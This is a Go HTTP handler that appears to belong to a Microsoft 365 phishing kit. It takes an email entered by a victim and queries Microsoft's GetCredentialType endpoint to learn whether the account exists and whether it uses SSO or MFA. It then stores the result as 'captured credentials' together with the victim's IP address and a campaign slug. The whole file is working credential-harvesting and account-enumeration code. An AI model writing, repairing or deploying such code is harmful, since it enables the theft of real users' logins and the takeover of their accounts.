package handlers

import (
	"bytes"
	"context"
	"encoding/json"
	"net"
	"net/http"
	"o365/capture"
	"strings"
	"time"
)

// Define the struct for the request payload to the upstream API
type credentialTypeRequest struct {
	Username                 string `json:"username"`
	IsOtherIdpSupported      bool   `json:"isOtherIdpSupported"`
	CheckPhones              bool   `json:"checkPhones"`
	IsRemoteNGCSupported     bool   `json:"isRemoteNGCSupported"`
	IsCookieBannerShown      bool   `json:"isCookieBannerShown"`
	ForceOTCLogin            bool   `json:"forceotclogin"`
	IsExternalFederation     bool   `json:"isExternalFederation"`
	IsRemoteConnectSupported bool   `json:"isRemoteConnectSupported"`
	TenantBrandingOption     string `json:"tenantBrandingOption"`
}

// Define the struct for the response from the upstream API
type upstreamResponse struct {
	IfExistsResult int    `json:"IfExistsResult"`
	ThrottleStatus int    `json:"ThrottleStatus"`
	Message        string `json:"Message"`
}

func HandleLoginCheck(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var in struct {
		Email string `json:"email"`
	}
	if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Email == "" {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}

	// Extract the slug from the request context (provided by SlugMiddleware)
	slug, ok := r.Context().Value("slug").(string)
	if !ok {
		http.Error(w, "slug not found in request context", http.StatusBadRequest)
		return
	}

	ip := getRealIP(r)

	// Prepare payload for the upstream request
	payload := credentialTypeRequest{
		Username:                 in.Email,
		IsOtherIdpSupported:      true,
		CheckPhones:              false,
		IsRemoteNGCSupported:     true,
		IsCookieBannerShown:      false,
		ForceOTCLogin:            false,
		IsExternalFederation:     false,
		IsRemoteConnectSupported: false,
		TenantBrandingOption:     "None",
	}
	body, _ := json.Marshal(payload)

	ctx, cancel := context.WithTimeout(r.Context(), 6*time.Second)
	defer cancel()

	// Upstream request to Microsoft login API
	req, _ := http.NewRequestWithContext(ctx,
		"POST",
		"https://login.microsoftonline.com/common/GetCredentialType",
		bytes.NewBuffer(body),
	)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		http.Error(w, "upstream error", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	var ms upstreamResponse
	if err := json.NewDecoder(resp.Body).Decode(&ms); err != nil {
		http.Error(w, "parse error", http.StatusBadGateway)
		return
	}

	// Process the response and determine authentication method
	tags := []string{}
	authMethod := ""
	msg := strings.ToLower(ms.Message)

	if ms.IfExistsResult == 4 || ms.IfExistsResult == 5 || strings.Contains(msg, "federated") || strings.Contains(msg, "sso") {
		tags = append(tags, "sso")
		authMethod = "sso"
	} else if strings.Contains(msg, "2fa") || strings.Contains(msg, "mfa") || strings.Contains(msg, "verify") {
		tags = append(tags, "2fa")
		authMethod = "mfa"
	} else {
		authMethod = "none"
	}

	// Save the captured credentials and link them with the slug
	capture.SaveCreds(map[string]string{
		"login":       in.Email,
		"passwd":      "",
		"tags":        strings.Join(tags, ","),
		"auth_method": authMethod,
		"slug":        slug, // Use the slug from the request context
	}, ip)

	// Retrieve the session validity
	sessionValid := capture.GetSessionValid(in.Email)

	// Prepare the response to the client
	out := map[string]any{
		"valid":           ms.IfExistsResult == 0,
		"ifExistsResult":  ms.IfExistsResult,
		"throttleStatus":  ms.ThrottleStatus,
		"upstreamMessage": ms.Message,
		"tags":            tags,
		"authMethod":      authMethod,
		"sessionValid":    sessionValid,
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(out)
}

func getRealIP(r *http.Request) string {
	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
		return parseFirstIP(ip)
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func parseFirstIP(ipList string) string {
	ips := strings.Split(ipList, ",")
	for _, ip := range ips {
		if parsedIP := net.ParseIP(strings.TrimSpace(ip)); parsedIP != nil {
			return parsedIP.String()
		}
	}
	return ipList
}
